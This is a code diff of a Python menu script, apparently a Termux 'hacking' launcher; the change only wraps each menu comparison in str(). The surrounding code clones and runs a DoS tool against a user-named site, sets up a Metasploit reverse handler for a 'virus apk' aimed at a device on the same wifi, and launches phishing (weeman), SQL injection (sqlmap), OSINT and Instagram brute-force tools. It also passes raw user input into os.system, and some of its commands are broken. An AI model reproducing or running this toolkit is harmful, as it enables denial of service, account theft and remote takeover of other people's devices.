@@ -455,10 +455,10 @@ def startscreen_menu():
 
 	""")
 	terminal = input("hAcK --> ")
-	if terminal == "1" :
+	if str(terminal) == "1" :
 		print("Hi")
 		print(stop)
-	elif terminal == "2" :
+	elif str(terminal) == "2" :
 		print("""
 [1]See all libraries
 [2]Download all libraries
@@ -471,7 +471,7 @@ def startscreen_menu():
 			down_libs()
 		else :
 			print(nothing)
-	elif terminal == "3" :
+	elif str(terminal) == "3" :
 		os.system("figlet Simple")
 		print(" ")
 		os.system("figlet functions")
@@ -495,24 +495,24 @@ def startscreen_menu():
 		elif s_funs == "4" :
 			rainBow_word_ans = input("Write your word :")
 			os.system("toilet -f mono12 -F gay " + rainBow_word_ans)
-	elif terminal == "4" :
+	elif str(terminal) == "4" :
 		ter2 = input("Enter site's link --> ")
 		os.system("whois " + ter2)
-	elif terminal == "1" :
+	elif str(terminal) == "1" :
 		print("Closing...")
 		os.system("clear")
-	elif terminal == "5" :
+	elif str(terminal) == "5" :
 		os.system(pkg_install + " fakeroot")
 		os.system("fakeroot")
 		os.system("clear")
 		print("Your phone is rooted for 1 time")
 		print("try 'whoami' ")
 		os.system("whoami")
-	elif terminal == "6" :
+	elif str(terminal) == "6" :
   	  print("Enter site's link")
   	  site_ip = input("hAcK --> ")
   	  os.system("ping " + site_ip)
-	elif terminal == "7" :
+	elif str(terminal) == "7" :
 		os.system("clear")
 		os.system("git clone https://github.com/CyberXCodder/XerXes.git")
 		os.system("gcc xerxes.c -o xerxes")
@@ -523,17 +523,17 @@ def startscreen_menu():
 		print("write site's name")
 		site_dos = input("hAcK --> ")
 		os.system("./xerxes " + site_dos + " 80")
-	elif terminal == "8" :
+	elif str(terminal) == "8" :
 		os.system("clear")
 		os.system("wget " + metasploit)
 		os.system("chmod +x metasploit.sh")
 		os.system(pkg_install + " vim")
 		os.system("clear")
 		os.system("Download complated")
-	elif terminal == "9" :
+	elif str(terminal) == "9" :
 		os.system("ifconfig")
 		print("second IP is your in wifi IP")
-	elif terminal == "10" :
+	elif str(terminal) == "10" :
 		print("This virus apk only works if you and other device connect the same wifi")
 		print("Enter for continue")
 		continiue = input("hAcK --> Press Enter")
@@ -555,11 +555,11 @@ def startscreen_menu():
 		os.system("set lhost " + your_wifi_IP)
 		os.system("set lport 4444")
 		os.system("exploit")
-	elif terminal == "11" :
+	elif str(terminal) == "11" :
 		os.system("pwd")
-	elif terminal == "12" :
+	elif str(terminal) == "12" :
 		os.system("whoami")
-	elif terminal == "S2" :
+	elif str(terminal) == "S2" :
 		os.system("clear")
 		passW = input("Enter password '")
 		if passW != hjdUv and passW != your_tool_id :
@@ -570,28 +570,28 @@ def startscreen_menu():
 11 111
 0111 1 10 110 0 11 1101 110 1011
 			""")
-	elif terminal == "13" :
+	elif str(terminal) == "13" :
 		termux_libs_down()
-	elif terminal == "14" :
+	elif str(terminal) == "14" :
 		os.system("cd")
 		os.system("cd /data/data/com.termux/files/usr/etc")
 		os.system("nano /data/data/com.termux/files/usr/etc/bash.bashrc")
-	elif terminal == "15" :
+	elif str(terminal) == "15" :
 		os.system("pkg update -y")
 		os.system("clear")
 		os.system("pkg upgrade -y")
 		os.system("clear")
 		print("Complated")
-	elif terminal == "16" :
+	elif str(terminal) == "16" :
 		os.system("clear")
 		os.system("git clone https://github.com/evait-security/weeman")
 		os.system("cd /data/data/com.termux/files/home/weeman")
 		os.system("python2 weeman.py")
-	elif terminal == "17" :
+	elif str(terminal) == "17" :
 		os.system("cd")
 		os.system("cd /data/data/com.termux/files/home/weeman")
 		os.system("python2 /data/data/com.termux/files/home/weeman/weeman.py")
-	elif terminal == "18" :
+	elif str(terminal) == "18" :
 		all_termux_libs_down()
 		os.system("clear")
 		print("""
@@ -606,12 +606,12 @@ in packages :
 	Userrecon
 	Ko-Dork
 		""")
-	elif terminal == "19" :
+	elif str(terminal) == "19" :
 		os.system("clear")
 		os.system(pkg_install + " tsu")
 		os.system("sudo tar xvzf ~/Download/ngrok-stable-linux-amd64.tgz -C /usr/local/bin")
 		print("COMPLATED")
-	elif terminal == "20" :
+	elif str(terminal) == "20" :
 		os.system("clear")
 		os.system("git clone https://github.com/thelinuxchoice/userrecon")
 		os.system("clear")
@@ -624,13 +624,13 @@ in packages :
 			os.system("bash /data/data/com.termux/files/home/userrecon/userrecon.sh")
 		else :
 			print("Ok.")
-	elif terminal == "21" :
+	elif str(terminal) == "21" :
 		os.system("clear")
 		os.system("git clone https://github.com/sundowndev/PhoneInfoga")
 		os.system("cd data/data/com.termux/files/home/PhoneInfoga")
 		os.system("ls")
 		os.system("clear")
-	elif terminal == "22" :
+	elif str(terminal) == "22" :
 		os.system("clear")
 		os.system("git clone https://github.com/Gameye98/Lazymux")
 		os.system("cd /data/data/com.termux/files/home/Lazymux")
@@ -642,14 +642,14 @@ in packages :
 			os.system("python3 /data/data/com.termux/files/home/Lazymux/lazymux.py")
 		else :
 			print("Ok.")
-	elif terminal == "23" :
+	elif str(terminal) == "23" :
 		os.system("python3 /data/data/com.termux/files/home/Lazymux/lazymux.py")
 		os.system("02")
 		os.system("01")
 		os.system("00")
 		os.system("cd data/data/com.termux/files/home/")
 		os.system("nmap --help")
-	elif terminal == "24" :
+	elif str(terminal) == "24" :
 		print("""
 [1] Scan a site
 [2] Scan site's security
@@ -665,22 +665,22 @@ in packages :
 			print("Enter site's IP")
 			nmap_site_ip = input("hAcK --> ")
 			os.system("nmap -sV " + nmap_site_ip)
-	elif terminal == "ID" :
+	elif str(terminal) == "ID" :
 		are_logo()
-	elif terminal == "25" :
+	elif str(terminal) == "25" :
 		os.system("clear")
 		os.system(pkg_install + " php")
 		os.system("clear")	
 		os.system("python3 /data/data/com.termux/files/home/Lazymux/lazymux.py")
 		os.system("02")
 		os.system("05")
-	elif terminal == "26" :
+	elif str(terminal) == "26" :
 		os.system("clear")
 		os.system("git clone https://github.com/ciku370/ko-dork")
 		os.system("chmod +x /data/data/com.termux/files/home/ko-dork/dork.py")
 		dorks_all()
 		os.system("python2 /data/data/com.termux/files/home/ko-dork/dork.py")
-	elif terminal == "27" :
+	elif str(terminal) == "27" :
 		print("Do you have SQLMAP?")
 		sqlmap_ans = input("[y/n]")
 		if sqlmap_ans == "y" or sqlmap_ans == "Y" :
@@ -694,7 +694,7 @@ in packages :
 			os.system("python2 /data/data/com.termux/files/home/sqlmap/sqlmap.py -u {sitelinkforsql} --dbs")
 		else :
 			print("Lazymux>02>09")
-	elif terminal == "28" :
+	elif str(terminal) == "28" :
 		os.system("clear")
 		os.system("pip install wordlist")
 		print("Do you have 3,0QB free space?")
@@ -710,7 +710,7 @@ in packages :
 			os.system("wordlist -m 7 -M 15 -o /sdcard/" + wordlistname + ".txt 0987654321qwertyuopasdfghjklizxcvbnmQWERTYUOPASDFGHJKLIZXCVBNM ")
 		else :
 			print("Download cancelled.")
-	elif terminal == "29" :
+	elif str(terminal) == "29" :
 		os.system("git clone https://github.com/fuck3erboy/instahack")
 		os.system("chmod +x /data/data/com.termux/files/home/instahack/hackinsta.py")
 		os.system("python /data/data/com.termux/files/home/instahack/hackinsta.py")
